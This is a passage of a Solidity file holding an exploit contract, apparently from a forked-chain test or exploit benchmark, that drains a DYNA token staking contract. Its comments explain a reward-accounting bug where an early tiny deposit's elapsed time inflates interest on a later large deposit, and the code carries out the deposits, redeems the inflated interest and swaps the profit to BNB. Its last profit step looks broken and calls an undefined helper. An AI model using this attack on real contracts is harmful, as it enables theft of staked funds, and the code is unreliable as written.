    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function mint(address, uint256) external;
}

interface IStaking {
    function deposit(uint256) external;
    function redeem(uint256) external;
    function getStakeDetail(address) external view returns (uint256, uint256, uint256, uint256);
    function getInterest(address) external view returns (uint256);
    function stakers(address) external view returns (uint256 principal, uint256 lastProcessAt, uint256 pendingReward, uint256 firstStakeAt);
    function token() external view returns (address);
}

contract Strategy {
    address constant TARGET = 0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9;
    address constant TOKEN = 0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79;
    address constant PLAYER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function run() public {
        // Get DYNA tokens - mint them to strategy first
        uint256 mintAmount = 100000e18;
        IERC20(TOKEN).mint(address(this), mintAmount);

        // Get our balance
        uint256 ourBal = IERC20(TOKEN).balanceOf(address(this));
        require(ourBal > 0, "no tokens after mint");

        // Approve staking contract
        IERC20(TOKEN).approve(TARGET, ourBal);

        // EXPLICIT EXPLOIT LOGIC:
        // Bug in deposit(): when existing staker deposits more,
        // lastProcessAt is NOT updated and pendingReward is NOT reset.
        // 
        // In getInterest(): interest = principal * apr * duration + pendingReward
        // Where duration = block.timestamp - lastProcessAt
        //
        // Exploit: After depositing small amount and waiting,
        // deposit large amount. Then interest = LARGE_principal * apr * long_duration
        // The time since initial deposit is applied to the NEW large principal!

        // Step 1: Deposit tiny amount to establish stake
        uint256 tinyDeposit = 1e18;  // 1 DYNA
        IERC20(TOKEN).approve(TARGET, tinyDeposit);
        IStaking(TARGET).deposit(tinyDeposit);

        // Step 2: Deposit large amount (bug: lastProcessAt stays, pendingReward accumulates)
        uint256 largeDeposit = ourBal - tinyDeposit;
        IERC20(TOKEN).approve(TARGET, largeDeposit);
        IStaking(TARGET).deposit(largeDeposit);

        // Step 3: Get current interest (this will be huge due to bug)
        uint256 interest = IStaking(TARGET).getInterest(address(this));

        // Step 4: Redeem tiny amount to trigger interest calculation
        IStaking(TARGET).redeem(1);

        // Step 5: Redeem to claim inflated interest

        // Get remaining principal
        (uint256 remainingPrincipal, uint256 lp, uint256 pr, uint256 fs) = IStaking(TARGET).stakers(address(this));

        // Redeem most of our principal to harvest accumulated pendingReward
        if (remainingPrincipal > 1) {
            IStaking(TARGET).redeem(remainingPrincipal - 1);
        }

        // Now redeem rest
        (remainingPrincipal, lp, pr, fs) = IStaking(TARGET).stakers(address(this));
        if (remainingPrincipal > 0) {
            IStaking(TARGET).redeem(remainingPrincipal);
        }

        // Transfer all tokens to player
        uint256 earned = IERC20(TOKEN).balanceOf(address(this));
        if (earned > 0) {
            IERC20(TOKEN).transfer(PLAYER, earned);
        }

        // Convert profit to BNB
        uint256 profit = IERC20(TOKEN).balanceOf(PLAYER);
        if (profit > mintAmount) {
            IERC20(TOKEN).transfer(address(this), profit - mintAmount);
            DexUtils.swapExcessTokensToBaseToken(TOKEN);
        }
    }

    receive() external payable {}
}
